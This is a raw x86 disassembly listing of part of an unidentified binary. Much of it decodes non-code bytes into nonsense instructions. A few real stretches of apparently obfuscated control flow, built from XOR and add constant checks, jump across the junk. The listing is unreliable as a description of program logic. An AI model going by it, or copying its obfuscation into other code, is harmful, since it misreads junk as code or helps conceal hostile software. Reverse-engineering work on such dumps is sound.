  40bf4e:	lods   eax,DWORD PTR ds:[esi]
  40bf4f:	fcmove st,st(5)
  40bf51:	push   edx
  40bf52:	stos   DWORD PTR es:[edi],eax
  40bf53:	lds    esi,FWORD PTR [ecx+esi*2+0x171e30b7]
  40bf5a:	sbb    al,0x8b
  40bf5c:	sbb    DWORD PTR [esi+0x5cd694c6],0xffffffc1
  40bf63:	jg     0x40bfbf
  40bf65:	jge    0x40bf65
  40bf67:	cmc    
  40bf68:	cld    
  40bf69:	aam    0x69
  40bf6b:	mov    ch,0xaa
  40bf6d:	xor    ebp,0xf2ca91cf
  40bf73:	mov    ch,0xa5
  40bf75:	or     DWORD PTR [ebx+0x31],ebp
  40bf78:	jmp    0x40bf86
  40bf7a:	mov    ebp,0xd6ae3925
  40bf7f:	jae    0x40bf68
  40bf81:	dec    esp
  40bf82:	scas   al,BYTE PTR es:[edi]
  40bf83:	dec    ecx
  40bf84:	mov    edi,DWORD PTR [ebp+0x8]
  40bf87:	mov    edi,DWORD PTR [edi]
  40bf89:	mov    edx,0x8a36
  40bf8e:	xor    ax,dx
  40bf91:	mov    edx,0x3afc
  40bf96:	add    ax,dx
  40bf99:	cmp    ax,WORD PTR [edi]
  40bf9c:	je     0x40c934
  40bfa2:	mov    eax,DWORD PTR [ebp-0x14]
  40bfa5:	xor    eax,ecx
  40bfa7:	add    eax,esi
  40bfa9:	mov    DWORD PTR [ebp-0x24],eax
  40bfac:	jmp    0x40c2c5
  40bfb1:	int3   
  40bfb2:	into   
  40bfb3:	retf   
  40bfb4:	ror    cl,1
  40bfb6:	(bad)  
  40bfb8:	ficom  DWORD PTR [edi+ebx*4+0x6c]
  40bfbc:	cmc    
  40bfbd:	ss repnz das 
  40bfc0:	ins    BYTE PTR es:[edi],dx
  40bfc1:	ds xchg esi,eax
  40bfc3:	js     0x40c03d
  40bfc5:	je     0x40c045
  40bfc7:	js     0x40c041
  40bfc9:	xchg   edx,eax
  40bfca:	mov    esi,0x343076f5
  40bfcf:	jg     0x40c022
  40bfd1:	int3   
  40bfd2:	outs   dx,BYTE PTR ds:[esi]
  40bfd3:	shr    BYTE PTR [edi-0x3e],1
  40bfd6:	das    
  40bfd7:	fwait
  40bfd8:	sub    al,0x5d
  40bfda:	mov    edi,0x5c793359
  40bfdf:	xchg   BYTE PTR [ecx+ebp*4-0x7e],cl
  40bfe3:	mov    ebx,0x44815cee
  40bfe8:	xchg   BYTE PTR [ebx],al
  40bfea:	mov    al,ss:0xd1197451
  40bff0:	stos   BYTE PTR es:[edi],al
  40bff1:	adc    eax,0xf360db0b
  40bff6:	lahf   
  40bff7:	lds    esp,FWORD PTR [edx+0x4897df38]
  40bffd:	dec    edx
  40bffe:	aas    
  40bfff:	in     al,0x13
  40c001:	loopne 0x40c01e
  40c003:	mov    ebp,?
  40c005:	sub    DWORD PTR [esi+ebx*4],eax
  40c008:	leave  
  40c009:	loopne 0x40bf90
  40c00b:	out    dx,eax
  40c00c:	xor    esp,DWORD PTR ds:0x6200ca54
  40c012:	addr16 ret 0x29da
  40c016:	add    BYTE PTR [esi],dh
  40c018:	rcl    BYTE PTR [ebx+edi*8-0x4],1
  40c01c:	loopne 0x40c039
  40c01e:	mov    edx,0x6de822d2
  40c023:	scas   eax,DWORD PTR es:[edi]
  40c024:	mov    fs,WORD PTR [ebp-0x1114ce1a]
  40c02a:	dec    ecx
  40c02b:	push   es
  40c02c:	out    dx,al
  40c02d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c02e:	inc    esp
  40c02f:	pop    es
  40c030:	adc    eax,0xd1a86064
  40c035:	cdq    
  40c036:	mov    edi,gs
  40c038:	mov    esi,0x5839897f
  40c03d:	mov    bh,bh
  40c03f:	jbe    0x40c086
  40c041:	pop    esi
  40c042:	xor    edi,ecx
  40c044:	xchg   ebp,eax
  40c045:	(bad)
  40c048:	je     0x40c072
  40c04a:	div    BYTE PTR [edx-0x2273874c]
  40c050:	or     eax,0xe9aff133
  40c055:	bound  edi,QWORD PTR [esi+0xee8701f]
  40c05b:	mov    ebx,0x884663c9
  40c060:	jg     0x40c04e
  40c062:	mov    esp,0x32413690
  40c067:	jmp    0x3169fe82
  40c06c:	mov    eax,ds:0x27d26577
  40c071:	mov    al,ds:0xe964e201
  40c076:	push   ss
  40c077:	xlat   BYTE PTR ds:[ebx]
  40c078:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c079:	mov    edx,0x359c3366
  40c07e:	inc    edx
  40c07f:	push   edi
  40c080:	jg     0x40c0af
  40c082:	retf   
  40c083:	inc    ecx
  40c084:	inc    edx
  40c085:	mov    bh,0xf4
  40c087:	ds stc 
  40c089:	jle    0x40c073
  40c08b:	or     bl,cl
  40c08d:	(bad)  
  40c08e:	mov    ds:0xd0fc83b6,al
  40c093:	mov    BYTE PTR ds:0xc6e97868,ch
  40c099:	iret   
  40c09a:	cwde   
  40c09b:	out    dx,eax
  40c09c:	pop    edx
  40c09d:	adc    BYTE PTR [esi+0x54],0x7b
  40c0a1:	dec    eax
  40c0a2:	mov    ds:0x2b674c3b,al
  40c0a7:	not    DWORD PTR [ecx]
  40c0a9:	mov    cl,0xcf
  40c0ab:	push   cs
  40c0ac:	push   esp
  40c0ad:	div    dh
  40c0af:	jp     0x40c0bd
  40c0b1:	mov    ds:0x1be88265,al
  40c0b6:	adc    al,0x78
  40c0b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0b9:	xchg   esp,eax
  40c0ba:	enter  0x3385,0x48
  40c0be:	push   0xffffffa3
  40c0c0:	loopne 0x40c071
  40c0c2:	fstp   DWORD PTR [eax-0x3b96e552]
  40c0c8:	add    DWORD PTR [ebp+0x39],ebp
  40c0cb:	jmp    0x33450bef
  40c0d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c0d2:	cwde   
  40c0d3:	ficomp WORD PTR [ecx-0x540d25d0]
  40c0d9:	mov    ecx,0x7a7a2ba8
  40c0de:	(bad)  
  40c0df:	jne    0x40c110
  40c0e1:	mov    ds:0xbaaed337,eax
  40c0e6:	xchg   esp,eax
  40c0e7:	xchg   ebx,eax
  40c0e8:	es test al,0xb0
  40c0eb:	xor    ebx,ecx
  40c0ed:	push   ss
  40c0ee:	sub    al,0x7c
  40c0f0:	adc    edx,esi
  40c0f2:	jle    0x40c0aa
  40c0f4:	jnp    0x40c088
  40c0f6:	shl    DWORD PTR [edi+0x21],cl
  40c0f9:	fsub   QWORD PTR [edi]
  40c0fb:	rcl    DWORD PTR [edx+0x3892dae4],1
  40c101:	rcl    DWORD PTR [esi+eax*2],0x98
  40c105:	xchg   esp,eax
  40c106:	mov    edx,fs
  40c108:	mov    dl,bl
  40c10a:	xor    bh,BYTE PTR [esi+0x10cbf34d]
  40c110:	test   DWORD PTR [ebp-0x1f],eax
  40c113:	sub    cl,0x91
  40c116:	out    dx,al
  40c117:	ins    DWORD PTR es:[edi],dx
  40c118:	das    
  40c119:	sub    bl,0xcb
  40c11c:	lock jns 0x40c0d8
  40c11f:	dec    ecx
  40c120:	test   BYTE PTR [ecx],cl
  40c122:	outs   dx,BYTE PTR ds:[esi]
  40c123:	dec    esi
  40c124:	pop    ebx
  40c125:	dec    edx
  40c126:	lds    esp,FWORD PTR [edx-0x6b]
  40c129:	int    0x7c
  40c12b:	inc    ebp
  40c12c:	cmp    eax,DWORD PTR [ecx+0x47]
  40c12f:	popa   
  40c130:	push   edx
  40c131:	inc    edi
  40c132:	in     al,dx
  40c133:	jo     0x40c0f2
  40c135:	fiadd  WORD PTR [eax+0x34a58dc6]
  40c13b:	jnp    0x40c175
  40c13d:	clc    
  40c13e:	addr16 adc eax,0xe60c380
  40c144:	push   ebx
  40c145:	xchg   esi,eax
  40c146:	push   cs
  40c147:	xor    al,0x63
  40c149:	mov    edi,0x45b286d6
  40c14e:	push   ss
  40c14f:	test   DWORD PTR [edx+0x74240ee0],esi
  40c155:	test   esp,eax
  40c157:	into   
  40c158:	sbb    esp,DWORD PTR [eax+ebp*1]
  40c15b:	jae    0x40c1ce
  40c15d:	adc    DWORD PTR [ebx-0xb69b734],0x954179de
  40c167:	addr16 cmp eax,0xc495d2be
  40c16d:	mov    cl,0x82
  40c16f:	int    0x5
  40c171:	pop    ebx
  40c172:	mov    ebx,DWORD PTR ds:0x6eaf8a90
  40c178:	(bad)  
  40c17a:	mov    dl,0x97
  40c17c:	or     bh,BYTE PTR [ecx+0xe]
  40c17f:	call   0x6581206c
  40c184:	repz rcr BYTE PTR [esi-0x239c04dc],1
  40c18b:	popa   
  40c18c:	xor    BYTE PTR [ebp-0x26],dh
  40c18f:	popf   
  40c190:	in     eax,0x7a
  40c192:	psrld  mm2,QWORD PTR [ebx+ebx*1-0x61]
  40c197:	repnz mov cs,WORD PTR [eax-0x1635374c]
  40c19e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c19f:	push   ecx
  40c1a0:	jmp    0x40c1a7
  40c1a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c1a3:	nop
  40c1a4:	stos   DWORD PTR es:[edi],eax
  40c1a5:	dec    esi
  40c1a6:	or     eax,0x6410517e
  40c1ab:	inc    eax
  40c1ac:	pop    ebp
  40c1ad:	mov    dl,0x19
  40c1af:	mov    eax,ds:0xafdee85
  40c1b4:	pushf  
  40c1b5:	add    al,0x3c
  40c1b7:	mov    DWORD PTR [edi+0x2c],edi
  40c1ba:	or     DWORD PTR ds:0xf90dce4a,ebp
  40c1c0:	dec    edi
  40c1c1:	push   0x47
  40c1c3:	mov    al,ds:0x23e604ae
  40c1c8:	sub    al,0x41
  40c1ca:	cmp    BYTE PTR [eax+0x54a612f2],dh
  40c1d0:	retf   
  40c1d1:	in     al,dx
  40c1d2:	enter  0xfcd1,0xe9
  40c1d6:	mov    edi,0xd7402a71
  40c1db:	outs   dx,BYTE PTR ds:[esi]
  40c1dc:	pop    sp
  40c1de:	add    al,al
  40c1e0:	mov    eax,0x6d94c1b5
  40c1e5:	xor    al,0xea
  40c1e7:	inc    ebp
  40c1e8:	and    eax,0x78490928
  40c1ed:	push   ecx
  40c1ee:	nop
  40c1ef:	pop    esp
  40c1f0:	mov    dh,0x5a
  40c1f2:	or     ch,BYTE PTR [edx+0x78]
  40c1f5:	test   eax,0x66d77258
  40c1fa:	int3   
  40c1fb:	hlt    
  40c1fc:	repz jge 0x40c191
  40c1ff:	in     eax,0xa2
  40c201:	xchg   edx,eax
  40c202:	inc    esp
  40c203:	imul   ecx,edx,0x53
  40c206:	stc    
  40c207:	dec    DWORD PTR [esi-0x56]
  40c20a:	xor    dl,BYTE PTR [ecx-0xc]
  40c20d:	add    al,0xf
  40c20f:	aam    0x78
  40c211:	jbe    0x40c27d
  40c213:	stos   DWORD PTR es:[edi],eax
  40c214:	(bad)  
  40c215:	dec    esi
  40c216:	mov    eax,0x1e25647c
  40c21b:	dec    esi
  40c21c:	call   0xe788:0x82a78c79
  40c223:	sub    ch,BYTE PTR [edx]
  40c225:	push   ss
  40c226:	stos   DWORD PTR es:[edi],eax
  40c227:	mov    dl,0x6c
  40c229:	mov    dl,0xb8
  40c22b:	xlat   BYTE PTR ds:[ebx]
  40c22c:	lds    ecx,FWORD PTR [eax+0x3a]
  40c22f:	mov    esp,0x2d33b9fc
  40c234:	les    ebp,FWORD PTR [ebp-0x5d]
  40c237:	push   edx
  40c238:	into   
  40c239:	push   0xcff34e89
  40c23e:	inc    edx
  40c23f:	enter  0xb827,0xa4
  40c243:	in     al,0x1f
  40c245:	mov    edi,0xbb6cf82b
  40c24a:	das    
  40c24b:	and    edx,DWORD PTR [eax]
  40c24d:	shl    al,0x99
  40c250:	fs sbb ch,cl
  40c253:	ins    BYTE PTR es:[edi],dx
  40c254:	add    al,0xef
  40c256:	stos   DWORD PTR es:[edi],eax
  40c257:	fmul   QWORD PTR [ebx-0x4a]
  40c25a:	and    DWORD PTR [edx],eax
  40c25c:	sbb    ebp,DWORD PTR [ecx+edx*2+0x8]
  40c260:	jp     0x40c2d4
  40c262:	adc    BYTE PTR [ebp+0xe47790a],ch
  40c268:	fs push ebp
  40c26a:	arpl   WORD PTR [ecx-0x60cd4093],si
  40c270:	test   al,0x87
  40c272:	das    
  40c273:	or     esp,esi
  40c275:	mov    eax,ds:0x74458140
  40c27a:	pop    ebp
  40c27b:	xor    DWORD PTR [ebp+0x42],0xffffffa4
  40c27f:	clc    
  40c280:	imul   eax,DWORD PTR [esi+ecx*2],0xfffffff0
  40c284:	and    al,BYTE PTR [esi-0xe]
  40c287:	push   edi
  40c288:	adc    al,0x3c
  40c28a:	ret    0xe5c6
  40c28d:	mov    ah,0x8d
  40c28f:	jge    0x40c2b5
  40c291:	mov    ds:0xd2c42c9c,eax
  40c296:	xchg   esi,eax
  40c297:	inc    ecx
  40c298:	mov    edx,0xd14ddfbc
  40c29d:	mov    dl,0xa
  40c29f:	and    DWORD PTR [edx-0x12],edi
  40c2a2:	scas   al,BYTE PTR es:[edi]
  40c2a3:	loope  0x40c2eb
  40c2a5:	dec    DWORD PTR [eax-0x7e058643]
  40c2ab:	push   edx
  40c2ac:	pop    eax
  40c2ad:	scas   al,BYTE PTR es:[edi]
  40c2ae:	xor    DWORD PTR [esp-0x14ace40f],edi
  40c2b5:	aaa    
  40c2b6:	jb     0x40c292
  40c2b8:	inc    ebx
  40c2b9:	sub    ah,BYTE PTR [ebx]
  40c2bb:	fld    TBYTE PTR [edx]
  40c2bd:	or     BYTE PTR [edx+0x4ba0ade],dl
  40c2c3:	sbb    eax,0xd8458b82
  40c2c8:	mov    di,WORD PTR [ebp-0x2c]
  40c2cc:	mov    ebx,0x8a36
  40c2d1:	jmp    0x40c5ea
  40c2d6:	xlat   BYTE PTR ds:[ebx]
  40c2d7:	cmp    al,0xc4
  40c2d9:	ds fcmovnb st,st(6)
  40c2dc:	(bad)  
  40c2de:	js     0x40c267
  40c2e0:	adc    BYTE PTR [eax-0x25],bh
  40c2e3:	cmp    cl,al
  40c2e5:	fstp   TBYTE PTR [edx]
  40c2e7:	fwait
  40c2e8:	js     0x40c362
  40c2ea:	je     0x40c36a
  40c2ec:	js     0x40c366
  40c2ee:	push   0xfffffffc
  40c2f0:	das    
  40c2f1:	or     al,0x19
  40c2f3:	push   ds
  40c2f4:	addr16 cmp al,0x1b
  40c2f7:	add    eax,ebx
  40c2f9:	mov    ecx,DWORD PTR [ecx-0x20af7307]
  40c2ff:	cmp    dh,BYTE PTR [ebp+0x69c1c684]
  40c305:	scas   eax,DWORD PTR es:[edi]
  40c306:	cmp    dl,ah
  40c308:	xchg   esi,eax
  40c309:	out    0x70,eax
  40c30b:	mov    al,0x6f
  40c30d:	jp     0x40c37a
  40c30f:	repnz (bad) 
  40c311:	mov    dh,0xb5
  40c313:	sub    BYTE PTR [edi+0x39dabab3],dl
  40c319:	adc    edx,DWORD PTR [edx]
  40c31b:	inc    esp
  40c31c:	lahf   
  40c31d:	push   esp
  40c31e:	pop    es
  40c31f:	or     edi,eax
  40c321:	std    
  40c322:	pop    edx
  40c323:	(bad)  
  40c325:	call   0xb098:0xed78b13c
  40c32c:	push   ebp
  40c32d:	xor    al,0x7d
  40c32f:	(bad)  
  40c330:	pop    esi
  40c331:	je     0x40c302
  40c333:	jbe    0x40c2d3
  40c335:	outs   dx,DWORD PTR ds:[esi]
  40c336:	fnsave [edx+0x3eec1fcd]
  40c33c:	pop    ebx
  40c33d:	jmp    FWORD PTR [esi-0x1f1ccc5b]
  40c343:	aad    0x6f
  40c345:	pushf  
  40c346:	out    0x18,eax
  40c348:	xor    al,0x6e
  40c34a:	push   ebx
  40c34b:	pop    ecx
  40c34c:	jbe    0x40c32d
  40c34e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c34f:	jmp    0x40c303
  40c351:	xlat   BYTE PTR ds:[ebx]
  40c352:	in     al,dx
  40c353:	in     al,0x9e
  40c355:	int    0x1d
  40c357:	add    BYTE PTR [ebx],0xfa
  40c35a:	add    al,0x67
  40c35c:	pop    ebx
  40c35d:	push   ebp
  40c35e:	mov    ch,0xde
  40c360:	push   edx
  40c361:	pop    esp
  40c362:	adc    DWORD PTR [edx],0xfffffffc
  40c365:	cdq    
  40c366:	stos   DWORD PTR es:[edi],eax
  40c367:	adc    DWORD PTR [ebp-0x76],edi
  40c36a:	mov    DWORD PTR [edx-0x12a3a8a],ebx
  40c370:	or     BYTE PTR [esi],dl
  40c372:	add    BYTE PTR [edx-0x1a00854e],cl
  40c378:	repz xchg esp,eax
  40c37a:	(bad)  
  40c37b:	pop    eax
  40c37c:	xor    DWORD PTR [ebx],eax
  40c37e:	mov    eax,ds:0x356d6299
  40c383:	inc    eax
  40c384:	push   ds
  40c385:	xchg   esi,eax
  40c386:	inc    eax
  40c387:	gs std 
  40c389:	pusha  
  40c38a:	mov    eax,ds:0xb77a481
  40c38f:	or     eax,0x7529da30
  40c394:	sub    eax,0x90fb8b68
  40c399:	xchg   edi,eax
  40c39a:	mov    esp,0xb7490bf5
  40c39f:	bound  edx,QWORD PTR [ebx+0x4760c35f]
  40c3a5:	mov    ebx,DWORD PTR [edx-0x10]
  40c3a8:	pop    ecx
  40c3a9:	mov    eax,0x6b9b0f81
  40c3ae:	sbb    bh,BYTE PTR [edx+0x67]
  40c3b1:	lds    esi,FWORD PTR [ebp+0xa095eea]
  40c3b7:	mov    eax,0x307bb650
  40c3bc:	sub    al,0x37
  40c3be:	jb     0x40c436
  40c3c0:	xor    bh,ah
  40c3c2:	loope  0x40c35b
  40c3c4:	jmp    0x40c38e
  40c3c6:	mov    DWORD PTR [ebp-0x72],ebp
  40c3c9:	cwde   
  40c3ca:	in     al,dx
  40c3cb:	inc    edi
  40c3cc:	adc    al,0x84
  40c3ce:	imul   edi,eax,0x4e3871f6
  40c3d4:	in     eax,dx
  40c3d5:	ds push ebp
  40c3d7:	int3   
  40c3d8:	or     cl,0x5f
  40c3db:	add    ch,BYTE PTR [ebp+0x3c7b2a83]
  40c3e1:	(bad)  
  40c3e2:	loope  0x40c398
  40c3e4:	sub    ebx,ebx
  40c3e6:	mov    eax,ds:0xd6fc5cec
  40c3eb:	mov    ebp,0x5b1131d9
  40c3f0:	rcl    DWORD PTR [eax+edi*8],0x84
  40c3f4:	and    BYTE PTR [ecx-0x7a],al
  40c3f7:	ins    BYTE PTR es:[edi],dx
  40c3f8:	sahf   
  40c3f9:	dec    edx
  40c3fa:	loope  0x40c42d
  40c3fc:	pop    ecx
  40c3fd:	sahf   
  40c3fe:	mov    eax,0x26ad7d9a
  40c403:	out    dx,eax
  40c404:	sbb    al,0x2d
  40c406:	cli    
  40c407:	in     eax,0xfb
  40c409:	lahf   
  40c40a:	sub    al,BYTE PTR [edi+0x5f]
  40c40d:	popa   
  40c40e:	ins    DWORD PTR es:[edi],dx
  40c40f:	sub    al,0xf3
  40c411:	mov    cl,0x2a
  40c413:	lock push 0x2601afae
  40c419:	sub    ebp,DWORD PTR [ecx+0x37348be]
  40c41f:	add    ah,BYTE PTR [esi+0x3910f6c1]
  40c425:	or     DWORD PTR [ecx-0x5770715],ebx
  40c42b:	pop    esi
  40c42c:	mov    ch,0x31
  40c42e:	les    esp,FWORD PTR [ebx-0xc]
  40c431:	mov    esp,0xdff3b587
  40c436:	push   ss
  40c437:	sbb    esi,DWORD PTR [eax]
  40c439:	cmp    eax,0x9b327cad
  40c43e:	es and al,0x2d
  40c441:	sub    BYTE PTR [ecx],0x6c
  40c444:	cmp    al,0x4d
  40c446:	stos   BYTE PTR es:[edi],al
  40c447:	inc    ecx
  40c448:	inc    esi
  40c449:	outs   dx,BYTE PTR ds:[esi]
  40c44a:	xchg   ebp,eax
  40c44b:	jnp    0x40c479
  40c44d:	xor    ebp,esp
  40c44f:	add    DWORD PTR ds:0x2d8fd3f3,ebp
  40c455:	mov    DWORD PTR [ecx-0x8],0xe37e3ddd
  40c45c:	outs   dx,DWORD PTR ds:[esi]
  40c45d:	and    esi,0xc4966418
  40c463:	jbe    0x40c43a
  40c465:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c466:	pop    ebp
  40c467:	test   al,0xcd
  40c469:	jmp    0x40c47c
  40c46b:	(bad)  
  40c46c:	pop    esi
  40c46d:	jecxz  0x40c460
  40c46f:	mov    edx,0xc3b2010f
  40c474:	and    esi,ebx
  40c476:	(bad)  
  40c478:	hlt    
  40c479:	dec    esp
  40c47a:	mov    ds:0xf01967e5,eax
  40c47f:	jne    0x40c420
  40c481:	mov    eax,0xcc0d4ce
  40c486:	cmp    al,0x6c
  40c488:	jmp    0x1c1:0x1cf96518
  40c48f:	sbb    eax,0x7370db32
  40c494:	mul    bl
  40c496:	fisub  WORD PTR ds:0x3f0ae276
  40c49c:	push   0x12
  40c49e:	lods   eax,DWORD PTR ds:[esi]
  40c49f:	pop    edi
  40c4a0:	add    DWORD PTR [ebx-0x26f5d898],ebp
  40c4a6:	mov    edx,0x80592211
  40c4ab:	push   ds
  40c4ac:	pop    edi
  40c4ad:	retf   
  40c4ae:	lods   eax,DWORD PTR ds:[esi]
  40c4af:	sahf   
  40c4b0:	cmp    dl,ch
  40c4b2:	sbb    BYTE PTR [edi+0x2c],cl
  40c4b5:	jge    0x40c46a
  40c4b7:	jmp    0x40c4d5
  40c4b9:	not    DWORD PTR [edi*2-0x313d927c]
  40c4c0:	cli    
  40c4c1:	loope  0x40c44d
  40c4c3:	cmp    al,0x5b
  40c4c5:	rcr    DWORD PTR [ecx+eax*1-0x1dab9d2b],0x6
  40c4cd:	xchg   BYTE PTR [edi],bh
  40c4cf:	clc    
  40c4d0:	nop
  40c4d1:	mov    eax,ds:0x7c1ff825
  40c4d6:	daa    
  40c4d7:	in     al,0x1
  40c4d9:	aad    0xb5
  40c4db:	or     ebx,DWORD PTR [ecx]
  40c4dd:	call   esp
  40c4df:	jo     0x40c55a
  40c4e1:	out    dx,eax
  40c4e2:	stc    
  40c4e3:	data16 add al,0xe2
  40c4e6:	pop    ecx
  40c4e7:	push   ss
  40c4e8:	cmp    dl,BYTE PTR [esi]
  40c4ea:	test   al,0x32
  40c4ec:	cmp    eax,0x78b2739c
  40c4f1:	aad    0x76
  40c4f3:	je     0x40c4a4
  40c4f5:	clc    
  40c4f6:	mov    cl,0x30
  40c4f8:	or     DWORD PTR [eax+0x265af2c2],0x58
  40c4ff:	or     ah,BYTE PTR [eax-0x78]
  40c502:	(bad)  
  40c503:	ja     0x40c4c9
  40c505:	fs dec esp
  40c507:	rcr    DWORD PTR [ebp+ebp*4-0x76],0x15
  40c50c:	and    al,0xd9
  40c50e:	imul   eax,ebp,0x61207fea
  40c514:	ret    
  40c515:	jns    0x40c58d
  40c517:	ins    DWORD PTR es:[edi],dx
  40c518:	mov    dh,0xc8
  40c51a:	and    dh,bh
  40c51c:	add    eax,DWORD PTR [esi-0x11]
  40c51f:	neg    DWORD PTR [eax+0x77]
  40c522:	int    0xc6
  40c524:	popf   
  40c525:	xchg   ecx,eax
  40c526:	adc    BYTE PTR [esi+ecx*1+0x316ea0ae],ah
  40c52d:	gs pop ss
  40c52f:	shl    edi,0xa9
  40c532:	sbb    ch,dh
  40c534:	mov    al,BYTE PTR [eax]
  40c536:	ret    
  40c537:	dec    esi
  40c538:	xchg   esp,eax
  40c539:	xchg   DWORD PTR [edi+0x2c],edi
  40c53c:	and    ebp,0xffffffc2
  40c53f:	jecxz  0x40c5b3
  40c541:	(bad)  
  40c542:	jecxz  0x40c53f
  40c544:	mov    dh,0x3a
  40c546:	arpl   cx,dx
  40c548:	xor    BYTE PTR [ecx-0x29],bh
  40c54b:	jo     0x40c51d
  40c54d:	push   esp
  40c54e:	push   es
  40c54f:	lods   eax,DWORD PTR ds:[esi]
  40c550:	cmp    ah,BYTE PTR [esi+0x4e]
  40c553:	xchg   esp,eax
  40c554:	int    0xe6
  40c556:	test   DWORD PTR [eax+0x40a9474c],0xc23362d7
  40c560:	adc    cl,BYTE PTR [edx-0x4107d2a8]
  40c566:	ss pop edx
  40c568:	pop    ss
  40c569:	outs   dx,DWORD PTR ds:[esi]
  40c56a:	(bad)  
  40c56b:	popa   
  40c56c:	xchg   ebx,eax
  40c56d:	fimul  WORD PTR [eax-0x21]
  40c570:	loop   0x40c580
  40c572:	push   ecx
  40c573:	dec    ebp
  40c574:	jae    0x40c523
  40c576:	arpl   WORD PTR [ebx+0x7dc4da80],bp
  40c57c:	or     al,0x96
  40c57e:	sub    al,0x36
  40c580:	enter  0x7eb5,0x40
  40c584:	and    eax,0x7de8a2c1
  40c589:	mov    edx,0xedefa188
  40c58e:	fldcw  WORD PTR [edx+0x5b]
  40c591:	or     ch,ah
  40c593:	fs call 0x7d9b28a8
  40c599:	lods   al,BYTE PTR ds:[esi]
  40c59a:	(bad)  
  40c59b:	dec    ecx
  40c59c:	xor    eax,0x82c4307
  40c5a1:	push   edx
  40c5a2:	iret   
  40c5a3:	ret    0x8d1
  40c5a6:	nop
  40c5a7:	inc    esp
  40c5a8:	(bad)  
  40c5a9:	ficomp DWORD PTR [ebx+0x70]
  40c5ac:	imul   ecx,DWORD PTR [ebx],0xb123babc
  40c5b2:	mov    dl,0xa1
  40c5b4:	add    ebx,DWORD PTR [ecx+ebp*1+0x639707b3]
  40c5bb:	scas   eax,DWORD PTR es:[edi]
  40c5bc:	je     0x40c591
  40c5be:	ins    DWORD PTR es:[edi],dx
  40c5bf:	aad    0x56
  40c5c1:	xor    eax,0x76f84572
  40c5c6:	pop    ebp
  40c5c7:	nop
  40c5c8:	fcom   DWORD PTR [eax-0x4b8cd852]
  40c5ce:	fwait
  40c5cf:	xor    eax,0x6dfd4900
  40c5d4:	in     eax,dx
  40c5d5:	out    dx,al
  40c5d6:	push   ebx
  40c5d7:	fadd   DWORD PTR [edi+0x78]
  40c5da:	cdq    
  40c5db:	xchg   BYTE PTR [esi],dh
  40c5dd:	push   eax
  40c5de:	ret    0x82df
  40c5e1:	dec    eax
  40c5e2:	ror    ch,1
  40c5e4:	pop    ebx
  40c5e5:	mov    ds:0x34407e0,eax
  40c5ea:	xor    di,bx
  40c5ed:	add    di,dx
  40c5f0:	movzx  edx,di
  40c5f3:	mov    edi,DWORD PTR [ebp-0x8]
  40c5f6:	xor    edi,ecx
  40c5f8:	lea    edx,[edx+edi*1+0x327298]
  40c5ff:	add    DWORD PTR [eax],edx
  40c601:	jmp    0x40c91a
  40c606:	cmp    eax,0xd9d2c1d7
  40c60b:	fcmove st,st(5)
  40c60d:	(bad)  ds:0x72d2d2f7
  40c613:	xchg   DWORD PTR [edi],ebx
  40c615:	fnstenv [esi]
  40c617:	cwde   
  40c618:	js     0x40c692
  40c61a:	je     0x40c69a
  40c61c:	js     0x40c696
  40c61e:	(bad)  
  40c61f:	hlt    
  40c620:	mov    ecx,ecx
  40c622:	mov    al,cl
  40c624:	dec    ebx
  40c625:	push   esp
  40c626:	mov    ds,WORD PTR [edi]
  40c628:	sti    
  40c629:	or     ch,ah
  40c62b:	and    eax,0xb0c28872
  40c630:	jb     0x40c669
  40c632:	gs test eax,0xb2b6c8b7
  40c638:	ss push 0xe3527e2f
  40c63e:	call   0x8bbe3889
  40c643:	fs jo  0x40c684
  40c646:	outs   dx,DWORD PTR ds:[esi]
  40c647:	mov    al,0xe8
  40c649:	(bad)  
  40c64a:	std    
  40c64b:	nop
  40c64c:	out    0xef,eax
  40c64e:	test   BYTE PTR [ecx+0x1e4f3751],bh
  40c654:	cmc    
  40c655:	int3   
  40c656:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c657:	dec    edx
  40c658:	inc    BYTE PTR [edi-0x1a25cff]
  40c65e:	pop    ebp
  40c65f:	xor    bh,BYTE PTR [edx+esi*8]
  40c662:	(bad)  
  40c664:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c665:	pop    edx
  40c666:	xor    BYTE PTR [ecx],ch
  40c668:	pop    es
  40c669:	retf   0xed11
  40c66c:	gs retw 0x6ffd
  40c671:	inc    ebx
  40c672:	push   es
  40c673:	dec    ebx
  40c674:	add    esp,eax
  40c676:	cmp    dl,ah
  40c678:	shl    BYTE PTR [eax+0x3],cl
  40c67b:	xor    ecx,eax
  40c67d:	retf   0x58f6
  40c680:	push   ds
  40c681:	shl    DWORD PTR [eax-0x6],cl
  40c684:	jbe    0x40c63a
  40c686:	mov    WORD PTR [esi],?
  40c688:	sbb    al,0xcb
  40c68a:	or     bl,dh
  40c68c:	(bad)  
  40c68e:	fistp  QWORD PTR [esi]
  40c690:	scas   al,BYTE PTR es:[edi]
  40c691:	mov    al,0x4b
  40c693:	sub    eax,0x1b936741
  40c698:	aad    0xef
  40c69a:	push   esp
  40c69b:	or     ch,bh
  40c69d:	pop    esi
  40c69e:	push   ebx
  40c69f:	(bad)  
  40c6a0:	cmp    al,0x49
  40c6a2:	jb     0x40c722
  40c6a4:	and    ebp,edx
  40c6a6:	dec    ebx
  40c6a7:	xchg   edx,eax
  40c6a8:	dec    cl
  40c6aa:	mov    ecx,0xb81ec8bf
  40c6af:	mov    eax,ds:0xe1e36928
  40c6b4:	ins    BYTE PTR es:[edi],dx
  40c6b5:	test   BYTE PTR [eax],ah
  40c6b7:	cmp    al,0x47
  40c6b9:	outs   dx,DWORD PTR ds:[esi]
  40c6ba:	test   DWORD PTR [edi+0x5ca07d78],0x7af93bc9
  40c6c4:	mov    ebx,?
  40c6c6:	adc    ecx,esi
  40c6c8:	sub    esi,DWORD PTR [esi]
  40c6ca:	push   ss
  40c6cb:	stc    
  40c6cc:	pop    eax
  40c6cd:	ss push ss
  40c6cf:	(bad)  
  40c6d0:	jns    0x40c6ae
